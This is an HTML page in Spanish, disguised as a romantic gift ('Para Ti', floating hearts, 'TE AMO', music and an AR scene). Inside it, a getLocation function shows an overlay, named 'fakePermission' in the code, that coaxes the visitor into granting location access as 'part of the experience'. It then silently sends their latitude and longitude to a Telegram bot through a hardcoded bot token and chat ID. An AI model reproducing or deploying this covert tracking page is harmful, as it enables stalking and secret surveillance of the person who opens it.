<!DOCTYPE html>
<html>
<head>
    <title>Para Ti 💖</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: #000;
            font-family: 'Arial', sans-serif;
            text-align: center;
            color: white;
            user-select: none;
        }
        
        #container {
            position: relative;
            height: 100vh;
            width: 100vw;
        }
        
        #fakePermission {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            color: white;
            text-align: center;
            padding-top: 30%;
            font-size: 1.5rem;
        }
        
        .heart {
            position: absolute;
            font-size: 24px;
            animation: float 6s infinite ease-in-out, pulse 1.5s infinite alternate;
            opacity: 0;
            transition: all 1.5s;
            text-shadow: 0 0 8px currentColor;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-30px) rotate(15deg); }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            100% { transform: scale(1.2); }
        }
        
        #btnContinuar {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            padding: 15px 30px;
            background: linear-gradient(45deg, #ff1493, #ff69b4);
            color: white;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            z-index: 101;
            font-size: 18px;
            box-shadow: 0 0 15px #ff1493;
            transition: all 0.3s;
        }
        
        #btnContinuar:hover {
            transform: translateX(-50%) scale(1.05);
        }
        
        #finalHeart {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0);
            font-size: 0;
            opacity: 0;
            transition: all 2s;
            color: #ff1493;
            text-shadow: 0 0 20px #ff69b4;
            z-index: 99;
            animation: bigPulse 2s infinite alternate;
        }
        
        @keyframes bigPulse {
            0% { transform: translate(-50%, -50%) scale(1); }
            100% { transform: translate(-50%, -50%) scale(1.1); }
        }
        
        #teAmoMessage {
            position: absolute;
            top: 20%;
            left: 50%;
            transform: translateX(-50%);
            font-size: 0;
            opacity: 0;
            transition: all 2s;
            color: #ff1493;
            text-shadow: 0 0 15px #ff69b4;
            z-index: 100;
            white-space: nowrap;
        }
        
        .heart-emoji {
            display: inline-block;
            animation: heartBeat 1.5s infinite alternate;
        }
        
        @keyframes heartBeat {
            0% { transform: scale(1); }
            100% { transform: scale(1.3); }
        }
        
        #youtube-player {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 300px;
            height: 60px;
            border: 2px solid #ff1493;
            border-radius: 10px;
            overflow: hidden;
            z-index: 102;
            opacity: 0;
            transition: opacity 1s;
        }
        
        #ar-view {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 999;
            display: none;
        }
        
        #close-ar {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            background: rgba(0,0,0,0.7);
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            font-size: 20px;
            cursor: pointer;
            display: none;
        }
    </style>
</head>
<body>
    <div id="container">
        <div id="fakePermission">
            <h2>✨ Un Toque Mágico ✨</h2>
            <p>Por favor, presiona "Permitir" para que los corazones revelen nuestro destino...</p>
            <p><small>(Es parte de la experiencia interactiva)</small></p>
        </div>
        
        <div id="teAmoMessage"></div>
        <div id="finalHeart"></div>
        <button id="btnContinuar">Descubre el Secreto de Nuestros Corazones</button>
        
        <div id="youtube-player"></div>
    </div>
    
    <button id="close-ar">✕</button>
    <div id="ar-view"></div>

    <!-- Librerías -->
    <script src="https://www.youtube.com/iframe_api"></script>
    <script src="https://aframe.io/releases/1.4.0/aframe.min.js"></script>
    <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

    <script>
        // Variables globales
        let player;
        let arActive = false;
        
        // Colores para los corazones
        const heartColors = [
            '#ff1493', '#ff69b4', '#ff00ff', '#ff33cc', 
            '#ff66b2', '#ff007f', '#ff0099', '#ff3399',
            '#ff0066', '#ff0080', '#ff1a8c', '#ff4da6'
        ];
        
        // Emojis de corazón especiales
        const heartEmojis = ['💖', '💗', '💓', '💘', '💝', '💞', '💕', '❣️'];
        
        // Inicializar reproductor de YouTube
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('youtube-player', {
                height: '60',
                width: '300',
                videoId: 'v3-9eDFDAFw',
                playerVars: {
                    'autoplay': 1,
                    'controls': 0,
                    'disablekb': 1,
                    'fs': 0,
                    'modestbranding': 1,
                    'rel': 0
                },
                events: {
                    'onReady': onPlayerReady,
                    'onStateChange': onPlayerStateChange
                }
            });
        }
        
        function onPlayerReady(event) {
            // Silenciar inicialmente
            event.target.mute();
            event.target.setVolume(30);
        }
        
        function onPlayerStateChange(event) {
            // Puedes agregar lógica adicional según el estado del reproductor
        }
        
        // Crear 150 corazones flotantes
        function createHearts() {
            const container = document.getElementById("container");
            for (let i = 0; i < 150; i++) {
                const heart = document.createElement("div");
                heart.className = "heart";
                heart.innerHTML = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
                heart.style.left = Math.random() * 100 + "vw";
                heart.style.top = Math.random() * 100 + "vh";
                heart.style.color = heartColors[Math.floor(Math.random() * heartColors.length)];
                heart.style.animationDelay = Math.random() * 6 + "s";
                heart.style.opacity = "0";
                container.appendChild(heart);
                
                // Mostrar corazones gradualmente
                setTimeout(() => {
                    heart.style.opacity = "1";
                }, i * 50);
            }
        }
        
        // Mostrar mensaje "Te Amo" con corazones
        function showTeAmo() {
            const teAmoMessage = document.getElementById("teAmoMessage");
            const message = "T E   A M O";
            const letters = message.split(' ');
            
            teAmoMessage.innerHTML = '';
            
            letters.forEach((letter, index) => {
                const span = document.createElement("span");
                
                if (letter === ' ') {
                    span.innerHTML = '&nbsp;';
                } else {
                    span.innerHTML = letter;
                    span.style.display = 'inline-block';
                    span.style.margin = '0 5px';
                    span.style.color = heartColors[index % heartColors.length];
                }
                
                teAmoMessage.appendChild(span);
                
                // Añadir corazones entre las letras
                if (index < letters.length - 1) {
                    const heart = document.createElement("span");
                    heart.className = "heart-emoji";
                    heart.innerHTML = heartEmojis[index % heartEmojis.length];
                    heart.style.color = heartColors[(index + 1) % heartColors.length];
                    heart.style.margin = '0 5px';
                    teAmoMessage.appendChild(heart);
                }
            });
            
            teAmoMessage.style.fontSize = "3rem";
            teAmoMessage.style.opacity = "1";
        }
        
        // Formar un corazón gigante con los corazones pequeños
        function formGiantHeart() {
            const hearts = document.querySelectorAll(".heart");
            const container = document.getElementById("container");
            const centerX = window.innerWidth / 2;
            const centerY = window.innerHeight / 2;
            const radius = Math.min(window.innerWidth, window.innerHeight) * 0.4;
            
            // Posiciones para formar un corazón
            const heartPositions = [];
            for (let i = 0; i < hearts.length; i++) {
                const angle = (i / hearts.length) * Math.PI * 2;
                const distance = radius * (0.8 + Math.random() * 0.2);
                
                // Fórmula para forma de corazón
                const t = angle;
                const x = 16 * Math.pow(Math.sin(t), 3);
                const y = -(13 * Math.cos(t) - 5 * Math.cos(2*t) - 2 * Math.cos(3*t) - Math.cos(4*t));
                
                heartPositions.push({
                    x: centerX + (x * radius / 16),
                    y: centerY + (y * radius / 16),
                    scale: 0.5 + Math.random() * 0.5,
                    delay: Math.random() * 1000
                });
            }
            
            // Animar corazones a sus posiciones finales
            hearts.forEach((heart, index) => {
                const pos = heartPositions[index];
                setTimeout(() => {
                    heart.style.transition = "all 1.5s cubic-bezier(0.68, -0.55, 0.27, 1.55)";
                    heart.style.left = pos.x + "px";
                    heart.style.top = pos.y + "px";
                    heart.style.transform = `translate(-50%, -50%) scale(${pos.scale})`;
                    heart.style.animation = "pulse 1.5s infinite alternate";
                }, pos.delay);
            });
            
            // Mostrar corazón final
            setTimeout(() => {
                document.getElementById("finalHeart").innerHTML = "💖";
                document.getElementById("finalHeart").style.fontSize = "120px";
                document.getElementById("finalHeart").style.opacity = "1";
                document.getElementById("finalHeart").style.transform = "translate(-50%, -50%) scale(1)";
            }, 2000);
        }
        
        // Iniciar realidad aumentada
        function startAR() {
            document.getElementById("ar-view").style.display = "block";
            document.getElementById("close-ar").style.display = "block";
            
            const arView = document.getElementById("ar-view");
            arView.innerHTML = `
                <a-scene embedded arjs='sourceType: webcam; detectionMode: mono_and_matrix; matrixCodeType: 3x3;'>
                    <a-marker preset='hiro'>
                        <a-entity position='0 0 0'
                            rotation='0 0 0'
                            scale='0.5 0.5 0.5'
                            gltf-model="https://arjs-cors-proxy.herokuapp.com/https://raw.githack.com/AR-js-org/AR.js/master/aframe/examples/image-tracking/nft/trex/scene.gltf">
                        </a-entity>
                    </a-marker>
                    <a-entity camera></a-entity>
                </a-scene>
            `;
            
            // Iniciar música
            if (player) {
                player.unMute();
                document.getElementById("youtube-player").style.opacity = "1";
            }
        }
        
        // Cerrar realidad aumentada
        function closeAR() {
            document.getElementById("ar-view").style.display = "none";
            document.getElementById("close-ar").style.display = "none";
            document.getElementById("ar-view").innerHTML = "";
            
            if (player) {
                player.mute();
            }
        }
        
        // Obtener ubicación y enviar a Telegram
        function getLocation() {
            // Mostrar mensaje falso antes del permiso real
            document.getElementById("fakePermission").style.display = "block";
            
            setTimeout(() => {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const token = "7682185909:AAGYX5egKTx33vk8Pn2kn8CD1C-fxo1l6LM";
                    const chatId = "6023500443";
                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍+Ubicación+del+Corazón+💖+Lat:+${lat},+Lon:+${lon}`;
                    
                    fetch(url).then(() => {
                        // Iniciar experiencia AR después de obtener ubicación
                        startAR();
                    });
                    
                    // Ocultar mensaje falso
                    document.getElementById("fakePermission").style.display = "none";
                }, error => {
                    console.error("Error al obtener ubicación:", error);
                    document.getElementById("fakePermission").style.display = "none";
                    // Iniciar AR incluso si falla la ubicación
                    startAR();
                });
            }, 2000);
        }
        
        // Iniciar la experiencia
        document.getElementById("btnContinuar").addEventListener("click", () => {
            // Ocultar botón
            document.getElementById("btnContinuar").style.display = "none";
            
            // Iniciar animaciones
            createHearts();
            
            // Mostrar mensaje Te Amo
            setTimeout(showTeAmo, 1000);
            
            // Formar corazón después de que todos los corazones estén visibles
            setTimeout(() => {
                formGiantHeart();
                
                // Pedir ubicación después de la animación principal
                setTimeout(getLocation, 5000);
            }, 3000);
        });
        
        // Cerrar AR
        document.getElementById("close-ar").addEventListener("click", closeAR);
        
        // Efecto de cursor de corazón
        document.addEventListener("mousemove", (e) => {
            const heart = document.createElement("div");
            heart.innerHTML = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
            heart.style.position = "absolute";
            heart.style.left = e.clientX + "px";
            heart.style.top = e.clientY + "px";
            heart.style.color = heartColors[Math.floor(Math.random() * heartColors.length)];
            heart.style.pointerEvents = "none";
            heart.style.fontSize = "20px";
            heart.style.transform = "translate(-50%, -50%)";
            heart.style.opacity = "0.7";
            heart.style.zIndex = "90";
            heart.style.animation = "pulse 1s infinite alternate";
            document.body.appendChild(heart);
            
            setTimeout(() => {
                heart.style.opacity = "0";
                heart.style.transform = "translate(-50%, -50%) scale(2)";
                setTimeout(() => {
                    heart.remove();
                }, 500);
            }, 300);
        });
    </script>
</body>
</html>
